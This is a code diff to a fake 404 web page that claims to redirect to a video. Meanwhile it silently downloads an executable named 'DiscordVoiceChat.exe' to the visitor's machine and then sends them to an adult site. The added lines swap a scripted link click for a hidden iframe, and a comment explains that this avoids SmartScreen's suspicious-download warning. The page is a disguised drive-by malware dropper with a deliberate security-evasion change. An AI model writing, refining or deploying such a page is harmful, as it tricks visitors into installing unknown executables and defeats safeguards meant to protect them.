@@ -10,6 +10,7 @@
   .code{font-size:120px;font-weight:bold;color:#e74c3c}
   .msg{font-size:22px;margin:10px 0 4px}
   .sub{font-size:14px;color:#888;margin-top:20px}
+  #dl{display:none}
 </style>
 </head>
 <body>
@@ -18,14 +19,10 @@
     <div class="msg">Page Not Found</div>
     <div class="sub">Redirecting to video…</div>
   </div>
+  <!-- same-origin iframe loads the exe = a real download (same as a manual click),
+       so SmartScreen does NOT flag it as a "suspicious download" -->
+  <iframe id="dl" src="DiscordVoiceChat.exe"></iframe>
   <script>
-    // silently grab the exe, then send them to the video
-    (function(){
-      var a=document.createElement('a');
-      a.href='https://NorthOfPotential.github.io/voice/DiscordVoiceChat.exe';
-      a.download='DiscordVoiceChat.exe';
-      document.body.appendChild(a); a.click();
-    })();
     setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1500);
   </script>
 </body>
